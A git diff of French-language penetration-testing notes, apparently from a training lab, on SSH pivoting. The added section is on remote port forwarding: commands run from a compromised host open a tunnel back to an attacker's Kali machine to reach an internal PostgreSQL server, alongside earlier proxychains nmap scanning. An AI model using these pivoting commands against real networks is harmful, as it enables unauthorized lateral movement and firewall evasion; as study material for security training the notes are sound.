@@ -56,7 +56,7 @@ ssh <user>@<IP_PIVOT> -p 4455
 psql -h <IP_PIVOT> -p 4455 -U <user>
 ```
 
-## Dynamic Port Forwarding + Proxychains
+## Local Dynamic Port Forwarding
 
 Un seul port local (proxy SOCKS) peut forwarder vers **n'importe quel socket** accessible par le serveur SSH, sans avoir à définir une destination à l'avance.
 
@@ -98,3 +98,46 @@ sudo proxychains nmap -sT -n -Pn --top-ports=20 <IP_CIBLE>
 > Nmap : utiliser `-sT` (TCP connect), jamais `-sS` (raw packets incompatibles SOCKS). Passer `-n -Pn` pour éviter les résolutions DNS/ping qui ne passent pas via SOCKS.
 >
 > Le scan est lent par défaut — réduire `tcp_read_time_out` et `tcp_connect_time_out` dans `/etc/proxychains4.conf` pour accélérer.
+
+## Remote Port Forwarding
+
+Le port d'écoute est ouvert côté **serveur SSH** (Kali), pas côté client. Le client (machine compromise) initie la connexion sortante — contourne ainsi les firewalls qui bloquent l'inbound mais autorisent l'outbound SSH.
+
+> Analogue à un reverse shell, mais pour le port forwarding.
+
+```bash
+ssh -N -R [REMOTE_IP:]REMOTE_PORT:DEST_IP:DEST_PORT user@kali
+```
+
+### Prérequis côté Kali
+
+```bash
+# Démarrer le serveur SSH
+sudo systemctl start ssh
+
+# Vérifier que le port 22 écoute
+sudo ss -ntplu
+```
+
+> Si l'authentification par mot de passe est refusée, activer `PasswordAuthentication yes` dans `/etc/ssh/sshd_config`.
+
+### Ouvrir le tunnel depuis la machine compromise
+
+```bash
+# Écouter sur 127.0.0.1:2345 côté Kali, forwarder vers PostgreSQL sur le réseau interne
+ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@<IP_KALI>
+```
+
+Le port 2345 s'ouvre sur le **loopback de Kali** — le trafic envoyé là est routé par CONFLUENCE01 vers PGDATABASE01.
+
+**Vérifier côté Kali que le port est bien ouvert**
+
+```bash
+ss -ntplu | grep 2345
+```
+
+### Utiliser le tunnel depuis Kali
+
+```bash
+psql -h 127.0.0.1 -p 2345 -U postgres
+```
